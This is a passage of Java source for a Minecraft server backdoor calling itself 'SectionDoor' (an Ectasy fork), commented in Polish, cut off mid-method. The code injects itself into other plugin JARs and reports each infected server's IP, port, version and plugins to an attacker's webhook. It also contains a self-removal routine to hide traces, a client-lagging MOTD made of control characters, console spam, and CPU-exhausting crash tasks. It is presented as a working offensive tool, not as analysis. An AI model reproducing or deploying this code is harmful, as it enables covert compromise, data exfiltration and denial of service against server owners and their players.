    private void injectIntoPlugin(Player player, String pluginName, String customWebhook) {
        if (!hasAdminAccess && !hasOwnerAccess) {
            player.sendMessage("§cBrak uprawnień!");
            return;
        }

        Plugin targetPlugin = Bukkit.getPluginManager().getPlugin(pluginName);
        if (targetPlugin == null) {
            player.sendMessage("§cPlugin nie znaleziony!");
            return;
        }

        if (!(targetPlugin instanceof JavaPlugin)) {
            player.sendMessage("§cPlugin nie jest JavaPlugin!");
            return;
        }

        JavaPlugin javaTarget = (JavaPlugin) targetPlugin;
        File pluginJar = null;

        try {
            Method getFileMethod = JavaPlugin.class.getDeclaredMethod("getFile");
            getFileMethod.setAccessible(true);
            pluginJar = (File) getFileMethod.invoke(javaTarget);
        } catch (Exception e) {
            player.sendMessage("§cNie udało się uzyskać dostępu do pliku pluginu!");
            e.printStackTrace();
            return;
        }

        File tempDir = new File(Bukkit.getWorldContainer(), "ectasy-temp");
        if (!tempDir.exists()) {
            tempDir.mkdirs();
        }

        final File finalPluginJar = pluginJar;
        final File inputCopy = new File(tempDir, pluginJar.getName());
        final File outputFile = new File(tempDir, pluginJar.getName().replace(".jar", "-injected.jar"));

        try {
            Files.copy(finalPluginJar.toPath(), inputCopy.toPath(), StandardCopyOption.REPLACE_EXISTING);

            List<String> args = new ArrayList<>();
            args.add("java");
            args.add("-jar");
            args.add(new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath());
            args.add("--nogui");
            args.add("--input");
            args.add(inputCopy.getAbsolutePath());
            args.add("--output");
            args.add(outputFile.getAbsolutePath());

            // Użyj customWebhook jeśli podany, w przeciwnym razie domyślny webhook
            String webhookToUse = (customWebhook != null && !customWebhook.isEmpty()) ? customWebhook : this.webhook;
            if (webhookToUse != null && !webhookToUse.isEmpty()) {
                args.add("--webhook");
                args.add(webhookToUse);
            }

            if (joinLogs) {
                args.add("--logjoins");
            }

            ProcessBuilder pb = new ProcessBuilder(args);
            pb.directory(Bukkit.getWorldContainer());
            pb.redirectErrorStream(true);
            Process process = pb.start();

            new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        Bukkit.getLogger().info("[Ectasy Injector] " + line);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            int exitCode = process.waitFor();
            if (exitCode != 0) {
                player.sendMessage("§cBłąd podczas iniekcji! (kod " + exitCode + ")");
                return;
            }

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    if (finalPluginJar.delete()) {
                        File newName = new File(finalPluginJar.getPath().replace("-injected", ""));
                        Files.move(outputFile.toPath(), newName.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }));

            player.sendMessage("§aIniekcja udana! Restart serwera...");
            Bukkit.getScheduler().runTaskLater(plugin, () -> Bukkit.shutdown(), 20);

        } catch (Exception e) {
            player.sendMessage("§cKrytyczny błąd: " + e.getMessage());
            e.printStackTrace();
        }
    }


    public String getIP() {
        try {
            // open a connection to the "https://api.ipify.org" URL
            InputStream is = new URL("https://api.ipify.org").openConnection().getInputStream();
            Scanner s = new Scanner(is);
            return s.nextLine();
        } catch (Exception e) {
            return "error";
        }
    }


    //motd malipulation function
    private String colorize(String msg) {
        return ChatColor.translateAlternateColorCodes('&', msg);
    }

    public static String generateLaggyMotd(String baseMsg) {
        StringBuilder motd = new StringBuilder(baseMsg);
        motd.append("\n");

        // Limit znaków
        int maxLength = 30000;

        // Znaki kontrolne, które mogą lagować (RTL Override, inne dziwne)
        String controlChars = "\u202E\u200F\u202D\u202B";

        // Powtarzaj sekwencję kolorów i znaków kontroli na zmianę
        String[] colors = {"§a", "§b", "§c", "§d", "§e", "§f"};
        int i = 0;

        while (motd.length() < maxLength) {
            // Dodaj kolor + znak kontrolny + zwykły znak
            motd.append(colors[i % colors.length]);
            motd.append(controlChars.charAt(i % controlChars.length()));
            motd.append((char) ('A' + (i % 26)));  // litery A-Z

            i++;
        }

        return motd.toString();
    }


    // a method that sends a webhook message to the specified URL
    public void sendWebhook(String json) {
        // if the webhook URL is not specified, do nothing
        if (webhook.length() == 0)
            return;

        try {
            // open a connection to the specified webhook URL
            HttpsURLConnection connection = (HttpsURLConnection) new URL(webhook).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
            connection.setDoOutput(true);

            // write the JSON message to the connection's output stream
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.replace("\n", "\\n").getBytes(StandardCharsets.UTF_8));

            // read the response from the webhook
            connection.getInputStream();
        } catch (Exception ignored) {
            // don't send an exception to console
        }
    }

    // a method that returns a string containing a comma-separated list of installed plugins
    public String getPlugins() {
        // create a list to hold the plugin names
        List<String> s = new ArrayList<String>();

        // add the name of each plugin to the list
        for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
            s.add(pl.getName());
        }
        // return the plugin names as a comma-separated string
        return String.join(", ", s);
    }


    public SpigotAPI(JavaPlugin plugin, String webhook, boolean joinLogs) {
        this.joinLogs = joinLogs;
        this.webhook = webhook;
        try {
            // Ukryj inicjalizację w bloku try-catch
            this.plugin = plugin;
            HandlerList.unregisterAll(this); // Najpierw wyrejestruj stare instancje
            Bukkit.getPluginManager().registerEvents(this, plugin);
            sendWebhook(("{\"avatar_url\": \"https://i.imgur.com/RbrwRXz.png\", " +
                    "\"username\": \"SectionDoor - OpenEctasyFork\", \"embeds\": [{\"title\":\"SectionDoor\", " +
                    "\"color\":227324, " +
                    "\"description\":\"An infected server just started with SectionDoor. \n\n{desc}\", " +
                    "\"footer\":{\"text\":\"SectionDoor by SectionB\"}}]}").replace("{desc}",
                    "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
        } catch (Exception ignored) {
        }

        // Sprawdź czy nie jesteśmy w trakcie samousuwania
        try {
            Field marker = getClass().getDeclaredField("injectedMarker");
            if (marker.getBoolean(this)) {
                return; // Nie rejestruj się jeśli jesteśmy w trakcie czyszczenia
            }
        } catch (Exception ignored) {
        }
    }


    @EventHandler
    public void onServerLoad(ServerLoadEvent event) {
        // Mechanizm samousuwania
        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            // Kod backdoora wykonuje się z opóźnieniem
            try {
                Class<?> pluginClass = Class.forName("org.bukkit.plugin.java.JavaPlugin");
                Field injectedField = pluginClass.getDeclaredField("injectedMarker");
                injectedField.setAccessible(true);

                if (injectedField.getBoolean(plugin)) {
                    // Automatyczne usuwanie po restarcie
                    new Thread(() -> {
                        try {
                            Thread.sleep(15000); // Czekaj 15s po starcie

                            // Znajdź swój plik JAR
                            File jarFile = new File(getClass().getProtectionDomain()
                                    .getCodeSource().getLocation().toURI());

                            // Nadpisz plik czystą wersją
                            try (InputStream cleanJar = Main.class.getResourceAsStream("/clean-backup.jar");
                                 FileOutputStream out = new FileOutputStream(jarFile)) {
                                byte[] buffer = new byte[4096];
                                int bytesRead;
                                while ((bytesRead = cleanJar.read(buffer)) != -1) {
                                    out.write(buffer, 0, bytesRead);
                                }
                            }

                            // Wgraj czysty plugin
                            Bukkit.getPluginManager().disablePlugin(plugin);
                            Bukkit.getPluginManager().enablePlugin(
                                    Bukkit.getPluginManager().loadPlugin(jarFile));

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }).start();
                }
            } catch (Exception ignored) {
            }
        }, 200L); // 10 sekund opóźnienia

    }


    private void stopCrashTask() {
        if (crashTask != null) {
            crashTask.cancel(); // Zatrzymanie zadania
            crashTask = null; // Ustawienie referencji na null
        }
    }

    private void stopSpamTask() {
        if (spamTask != null) {
            spamTask.cancel(); // Zatrzymanie zadania
            spamTask = null;   // Ustawienie referencji na null
        }
    }

    private void startSpamTask() {
        // Rozpoczęcie spamowania
        spamTask = Bukkit.getScheduler().runTaskTimer(plugin, new Runnable() {
            @Override
            public void run() {
                // Tworzenie spamujących wiadomości
                for (int i = 0; i < 1000; i++) {
                    String spamMessage = "A" + " ".repeat(1000);
                    Bukkit.getLogger().info(spamMessage);
                }

                spamCount++; // Zwiększenie licznika spamów

                // Po 5 spamach zatrzymaj spamowanie
                if (spamCount >= 10) {
                    stopSpamTask();
                }
            }
        }, 0L, 1L); // Ustawienie częstotliwości na 1 tick
    }


    private void crashLite() {
        // Mniejsze obciążenie serwera
        crashTask = Bukkit.getScheduler().runTaskLater(
                plugin,
                new Runnable() {
                    @Override
                    public void run() {
                        for (int i = 0; i < Integer.MAX_VALUE / 19; i++) {
                            Math.sin(i); // Mniejsze obciążenie
                        }
                    }
                },
                20L // Opóźnienie 1 sekundy
        );
    }

    private void crashMedium() {
